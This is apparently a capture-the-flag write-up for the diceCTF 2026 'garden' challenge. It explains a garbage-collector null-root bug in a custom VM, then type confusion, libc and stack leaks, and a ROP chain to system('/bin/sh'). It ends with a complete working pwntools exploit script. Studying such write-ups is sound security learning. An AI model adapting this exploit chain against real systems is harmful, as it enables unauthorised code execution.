---
author: acni
title: "pwn/diceCTF 2026: garden"
pubDatetime: 2026-03-11
slug: 'pwn-dicectf2026-garden'
featured: true
description: "Using type confusion and a logic error in a custom VM GC challenge"
tags:
  - pwn
---

This was a custom VM/heap challenge from diceCTF 2026. I thought it was a very fun and interesting challenge.

# Talking about the source

```c
void init_heap(size_t initial_size) {
    heap_base = mmap(NULL, 0x100000000LL, PROT_NONE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    // now, map the initial heap region
    mprotect(heap_base, initial_size, PROT_READ | PROT_WRITE);
    memset(heap_base, 0, initial_size);
    heap_size = initial_size;
    heap_used = 128; // reserve first 128 bytes for fun
}
```
init_heap() maps the inital heap region and reserves the first 128 and leaves it unused, so all the bytes inside are 0. This sets up the condition for the bug to happen later on. 


```c
typedef struct {
      uint16_t length;
      uint16_t mark_word;
      ref_t entries[];
} arr_header_t;

typedef struct {
      arr_header_t header;
      uint32_t *data;
      size_t obj_size;
} off_heap_obj_t;
```
arr_header_t is the normal VM array object. off_heap_obj_t begins with the same array style header, but also contains a real native pointer data and a length obj_size.

This exploit works because once a fake huge array overlaps a real off_heap_obj_t, indexed reads and writes on B can corrupt offheap->data and offheap->obj_size.

```c
static void mark_reachable(ref_t ref, gc_ctx_t *visited) {
    arr_header_t *arr = AS_ARR_HEADER(ref); //pointer assigned to header
    if (arr->mark_word & 0x2) { // already marked
        return;
    }
    arr->mark_word |= 0x2; // mark it
    // add to visited list
    visited->objs = realloc(visited->objs, sizeof(sized_object) * (visited->obj_count + 1));
    // grow array 
    visited->objs[visited->obj_count++] = (sized_object){ .object = ref, .size = arr->length };
    if (arr->mark_word & 1) { // contains pointers
        for (uint16_t i = 0; i < arr->length; i++) {
            ref_t entry = arr->entries[i];
            if (entry != 0) // skip null pointers
                mark_reachable(entry, visited);
        }
    }
}
```

- start from one object reference
- mark the object as live
- remember it in a list of live objects
- if that object contains references to other objects, recursively do the same for all of those

Notice how it never checks if ref != 0. 

```
So before this function is called, ctx.obj is a list like this:
object: 128, size: 1 
object: 136  size: 5 
object: 160, size: 8 

If the bug happens and mark_reachable(0) runs, then it might look like:
object: 0,   size: 0 
object: 128, size: 1
object: 136 size: 5
object: 160, size: 8 

And this will be later exploited. (more details later)
```

# garbage_collect


```c
for (size_t i = 0; i < num_roots; i++) {
        mark_reachable(roots[i], &ctx);
}
```

The root walking loop does not check if (roots[i] != 0) first. That means a null reference is allowed to do mark_reachable(0, &ctx). Then, AS_ARR_HEADER(0) becomes heap_base + 0. (ref is passed in, which is the offset. as arr header interprets this into a heap address + ref, which is just the base heap address.)
Since init_heap() zeroed the beginning of the heap and reserved the first 128 bytes, the GC sees a fake object with length 0 and mark_word = 0. So the collector records a fake live object at old ref 0 with size 0.

```c
    for (size_t i = 0; i < ctx.obj_count; i++) {
        arr_header_t *arr = AS_ARR_HEADER(ctx.objs[i].object); //load obj header 
        arr->mark_word &= ~0x2; // unmark for next GC
        size_t total_size = sizeof(arr_header_t) + ctx.objs[i].size * sizeof(ref_t); //how many bytes to copy
	memmove(heap_base + new_heap_used, arr, total_size); 
	// memove to next free slot (same heap buffer)
        ctx.new_locations[i] = (ref_t)new_heap_used;
        new_heap_used += total_size;
    }
```

Each object is defined as

```c
typedef struct {
      ref_t object;
      size_t size;
  } sized_object;
```
each entry stores 
- object: old heap reference (ref_ , like ref 0 is heap_base + 0 and ref 128 is heap_base + 128)
- size: how large that object is


Now imagine this live-object list after doing the mark_reachable(0)

object: 0,   size: 0 
object: 128  size: 1 
object: 136  size: 5 

The copy loop then does this:

```
1. Copy the fake object {0, 0}
- source = heap_base + 0
- destination = heap_base + 128
- size = 4 + 0*4 = 4
- record new_locations[0] = 128
- now new_heap_used = 132
2. Copy real object @ {128, 1}
- destination = heap_base + 132
- size = 4 + 1*4 = 8
- record new_locations[1] = 132
- now new_heap_used = 140
3. Copy real object @ {136, 5}
- destination = heap_base + 140
- size = 4 + 5*4 = 24
- record new_locations[2] = 140
```
Without the fake object, those real objects would have landed at 128 and 136. With the fake object first, they land at 132 and 140
So every real object got shifted by +4.

This bug will be exploited and explained later, specifically to corrupt a header's length variable. 


# Exploit

```py
push_num(0xFFFF)
push_num(0x41414141)
push_num(1)
# So the stack before new array obj is 0xFFFF, 0x41414141, len=1
op(new_array_obj)
```

New_array_obj pops the 1, allocates the object array of length 1
then, the array is zeroed [0] = 0

```py
push_num(0)
op(get_elem_obj)
```

then this pops the index 0, and pops the object array, and reads O[0]. 

- since O[0] is zero, then this pushes the null reference 0. (actually 0)
- the vm stack now contains the value 0 as a reference - the stack contains “0”

```py
op(garbage_collect)
```

before it runs, the vm stack has 
A: numeric array (0xffff)
B: numeric array (0x41414141)
0 - null reference

during garbage collect, it calls mark_reachable() on every stack root.

Because one of those roots is 0, it invents a fake live object at heap_base + 0 

So instead of A being copied to 128, it is copied to 132, and B is copied from 136 to 140. 

We know this because we can just count from the first allocation. First object takes up from 128-136, and 136 to 140 is the header for the next allocation B (at the start of exploit)

So GC copies A 128 to 132, so 0xffff lands at 136-140 (last 4 bytes), but 136 to 140 used to be B head. B's header becomes 0x0000ffff, and 0x41414141 stays as B[0].

Because of the little endian layout, 0x0000ffff turns into 

```
length = 0xffff
mark_word = 0
```

So after this functino is called, B is turned into a fake numeric array. 

```
length = 0xffff
mark = 0
entry[0] = 0x41414141
```

and then right after this, the VM stack is ``[A, B, 0]``
so

```py
op(drop) # removes top item (0)
op(swap) # swaps top two (B, A) now
op(drop) #removes top again so now it's just (B)
#and now you only have the forged array B with the big length.
```

Now the next steps, the goal is to configure stash, which is an 8 slot object array used to save important objects so that the exploit can fetch them later. 

I won’t go through the opcodes throughly but basically it

- Creates E, which is an off heap object (i named it E because E)
- Creates stash, the 6 slot object array
- Stores E in stash[1]
- Stores B in stash[0]
- Only stash on the stack now.

now this, 

```py
for _ in range(1100):
        op(dup)
```

this duplicates the stash reference with 1101 copies, which forces the program to free then move the old stack chunk. This forces it to realloc() the VM stack, while freeing the other one. As a result, it now contains a libc pointer that we can later leak for a libc leak. 

B
- header: length=0xffff, mark=0
- entries start at B+4
E
- header
- data ptr low  = B[5]
- data ptr high = B[6]
- obj_size low  = B[7]
- obj_size high = B[8]


# Stage 2

This block rewrites the real off-heap object E so it points at the freed old VM stack chunk instead
of its original calloc() buffer.

This is doable because now that the B array is forged to have a longer length, it overlaps the E struct in memory

- B[5] and B[6] map to  E->data
- B[7] and B[8] map to E->obj_size
- read the current low 4 bytes of E->data
- subtract specifically 0x27f0 to move that pointer from the current stack chunk to the old freed stack chunk
- write the new low 4 bytes back to E->data

(basically, just change it to the old freed stack data)

- set E->obj_size = 0x40 words so later off-heap reads are allowed over that region

after this block, GET_OFFHEAP_NUM on E no longer reads E’s original buffer, it reads from the freed old VM stack chunk. That freed chunk contains allocator metadata with a libc pointer, which the next stage will leak.

```py
b_get(5)
push_num(0x27F0)
op(sub_nums)
b_set_from_top(5)
b_get(6)
b_set_from_top(6)
push_num(0x40)
b_set_from_top(7)
push_num(0)
b_set_from_top(8)
```

# Stage 3

This stage is just recoveringthe libc base and storing it in stash[2] and stash[3]

- e_get(0)
    - read the low bits of the qword in the freed chunk, which is part of the unsorted bin pointer
- push_num(libc.sym["main_arena"] + 0x60)
    - push the known offset of that leaked pointer inside libc, so that you can….
- op(sub_nums)
    - subtract the known offset!
    - result: low 4 bytes of libc_base
- stash_store(2)
    - save that low half in stash[2]
- e_get(1)
    - read the high 4 bytes of the leaked pointer
- stash_store(3)
    - save that high half in stash[3]

now we have the libc base.
```py
e_get(0)
push_num(libc.sym["main_arena"] + 0x60)
op(sub_nums)
stash_store(2)
e_get(1)
stash_store(3)
```
# Stage 4

This stage is trying to leak the pointer inside libc environ. By leaking this value, it is also a stack pointer. This is where to put the ROP chain. 
So now, stash2 and 3 have the bytes of libc_base (2 has the lower 4 bytes)

```py
stash_get(2) 
push_num(libc.sym["environ"])
add_nums()
```

This basically does lower 4 bytes of libc_base + environ in order to get the libc address of environ. 

Then, 
```py
  b_set_from_top(5)
  stash_get(3)
  b_set_from_top(6)
  push_num(4)
  b_set_from_top(7)
  push_num(0)
  b_set_from_top(8)
```

b_set_from_top writes that into E data’s lower 4 bytes 
stash_get and b set from top 6 writes the higher 4 bytes of the E data 
push num 4 and 0 set E’s obj size to 4 (4 for lower, 0 for high 4 bytes)
Now, E is E -> data = environ libc address and objsize is 4

Then, 
```py
  e_get(0)
  stash_store(4)
  e_get(1)
  stash_store(5)
```

e_get(0) now will read the function address at E data, so now it is reading the address at libc environ. e_get 0 and 1 takes the bytes at *environ and stores them into 4 and 5. 

# Stage 5

This stage is about writing the ROP chain on the saved RIP. 

Using the leaked environ pointer that stash 4 and 5 have, stash_get(4), push_num(0x130), sub_nums is environ - 0x130, and then b set from top writes it into E data. Then, push_num(0x20), b_set_from_top(7), push_num(0), b_set_from_top(8) set E obj_size = 0x20 words so
the later writes are allowed.

```py
stash_get(4)
push_num(0x130)
op(sub_nums)
b_set_from_top(5)
stash_get(5)
b_set_from_top(6)
push_num(0x20)
b_set_from_top(7)
push_num(0)
b_set_from_top(8)
```

Before, E was pointing to environ, but now it is pointing to the saved RIP. After that, the function writes the ROP chain to the saved RIP with the function write_qword.

```py
write_qword(0, 0x10F78B) # pop rdi; ret
write_qword(1, next(libc.search(b"/bin/sh\x00"))) # /bin/sh
write_qword(2, 0x2882F) # ret (for stack alignment), otherwise system is not 16 bit aligned
write_qword(3, libc.sym["system"])
```

And now, we can send the payload. Once it returns back to the return address, it will hit the ROP chain and we will get a shell.

```py
# stash[0] = B
# stash[1] = E (the off heap target)
# stash[2] = libc base low 4 bytes
# stash[3] = libc base high 4 bytes
# stash[4] = *environ low 4 bytes
# stash[5] = *environ high 4 bytes
```

# Final Exploit

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF("garden_patched")
libc = ELF("libc.so.6")

context.binary = exe
context.log_level = "info"
context.terminal = ['alacritty', '-e']
host = args.HOST or "addr"
port = int(args.PORT or 1337)


# These come from the enum order in garden.c.
push_num_array = 0
add_nums = 1
sub_nums = 2
get_elem_obj = 6
set_elem_obj = 7
get_elem_num = 8
set_elem_num = 9
get_offheap_num = 11
set_offheap_num = 12
new_array_obj = 13
new_offheap_obj = 15
dup = 16
swap = 17
drop = 18
dup_x1 = 19
garbage_collect = 20

words = []
#helpers
# (some helpers were made by ai bc im skill issued lmao)
def op(code):
    words.append(code)

def push_num(value):
    words.extend([push_num_array, 1, value & 0xFFFFFFFF])

def stash_get(slot):
    push_num(slot)
    op(get_elem_obj)


def stash_store(slot):
    push_num(slot)
    op(set_elem_obj)


def b_get(idx):
    stash_get(0)
    push_num(idx)
    op(get_elem_num)


def b_set_from_top(idx):
    op(swap)
    stash_get(0)
    op(swap)
    push_num(idx)
    op(set_elem_num)


def e_get(idx):
    stash_get(1)
    push_num(idx)
    op(get_offheap_num)


def e_set_from_top(idx):
    op(swap)
    stash_get(1)
    op(swap)
    push_num(idx)
    op(set_offheap_num)


def write_qword(idx, offset):
    stash_get(2)
    push_num(offset)
    op(add_nums)
    e_set_from_top(idx * 2)
    stash_get(3)
    e_set_from_top(idx * 2 + 1)


# stage 1
push_num(0xFFFF)
push_num(0x41414141)
push_num(1)
op(new_array_obj)
push_num(0)
op(get_elem_obj)
op(garbage_collect)
op(drop)
op(swap)
op(drop)

push_num(1)
op(new_offheap_obj)

push_num(6)
op(new_array_obj)

op(dup_x1)
op(swap)
push_num(1)
op(set_elem_obj)

op(dup_x1)
op(swap)
push_num(0)
op(set_elem_obj)

for _ in range(1100):
    op(dup)

# stage 2
b_get(5)
push_num(0x27F0)
op(sub_nums)
b_set_from_top(5)
b_get(6)
b_set_from_top(6)
push_num(0x40)
b_set_from_top(7)
push_num(0)
b_set_from_top(8)

# stage 3
e_get(0)
push_num(libc.sym["main_arena"] + 0x60)
op(sub_nums)
stash_store(2)
e_get(1)
stash_store(3)

# stage 4
stash_get(2)
push_num(libc.sym["environ"])
op(add_nums)
b_set_from_top(5)
stash_get(3)
b_set_from_top(6)
push_num(4)
b_set_from_top(7)
push_num(0)
b_set_from_top(8)
e_get(0)
stash_store(4)
e_get(1)
stash_store(5)

# stage 5
stash_get(4)
push_num(0x130)
op(sub_nums)
b_set_from_top(5)
stash_get(5)
b_set_from_top(6)
push_num(0x20)
b_set_from_top(7)
push_num(0)
b_set_from_top(8)

write_qword(0, 0x10F78B)
write_qword(1, next(libc.search(b"/bin/sh\x00")))
write_qword(2, 0x2882F)
write_qword(3, libc.sym["system"])

body = "\n".join(str(x) for x in words)
payload = f"{len(words)}\n{body}\n".encode()


def conn():
    if args.LOCAL:
        return process([exe.path])
    elif args.REMOTE: 
        return remote(host, port)

io = conn()
io.send(payload)
io.interactive()
```
